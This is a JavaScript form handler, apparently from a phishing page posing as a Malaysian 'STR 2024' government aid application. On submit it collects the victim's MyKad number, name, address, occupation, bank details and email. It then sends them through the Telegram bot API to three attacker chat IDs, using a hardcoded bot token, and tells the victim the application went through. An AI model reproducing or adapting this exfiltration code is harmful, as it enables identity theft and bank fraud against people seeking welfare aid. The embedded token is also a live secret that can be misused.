document.querySelector("form").addEventListener("submit", function (event) {
  event.preventDefault(); // Mencegah form submit default

  // Ambil data dari setiap input
  const noMykad = document.querySelector('input[name="no_mykad"]').value;
  const nama = document.querySelector('input[name="nama_mykad"]').value;
  const umur = document.querySelector('input[name="umur_mykad"]').value;
  const alamat = document.querySelector('input[name="alamat_mykad"]').value;
  const jantina = document.querySelector('select[name="jantina_mykad"]').value;
  const pekerjaan = document.querySelector(
    'select[name="pekerjaan_mykad"]'
  ).value;
  const namaBank = document.querySelector('select[name="bank_mykad"]').value;
  const noAkaunBank = document.querySelector('input[name="no_mykad"]').value;
  const email = document.querySelector('input[name="emel_mykad"]').value;

  // Format pesan yang akan dikirim ke Telegram
  const message = `🔹 **Permohonan Baru STR 2024** 🔹\n
            *No. MyKad*: ${noMykad}\n
            *Nama*: ${nama}\n
            *Umur*: ${umur}\n
            *Alamat*: ${alamat}\n
            *Jantina*: ${jantina}\n
            *Pekerjaan*: ${pekerjaan}\n
            *Nama Bank*: ${namaBank}\n
            *No. Akaun Bank*: ${noAkaunBank}\n
            *Alamat e-Mel*: ${email}`;

  // Token dan chat_id bot Telegram
  const botToken = "7718345342:AAEFgRlAEIPxePQ6BTFdtKb0an8QRbWdXm0"; // Ganti dengan token bot Anda
  const chatIds = ["6124038392", "5460230196", "7512534303"]; // Daftar beberapa chat ID penerima pesan

  // URL API untuk mengirim pesan
  const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // Kirim data ke Telegram untuk setiap chat_id
  chatIds.forEach((chatId) => {
    fetch(telegramAPI, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log(`Pesan berhasil dikirim ke chat ID: ${chatId}`);
        } else {
          console.error(
            `Gagal mengirim pesan ke chat ID ${chatId}: ${data.description}`
          );
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terdapat ralat dalam menghantar data.");
      });
  });

  // Menampilkan notifikasi kepada pengguna
  alert("Permohonan berjaya dihantar!");
});
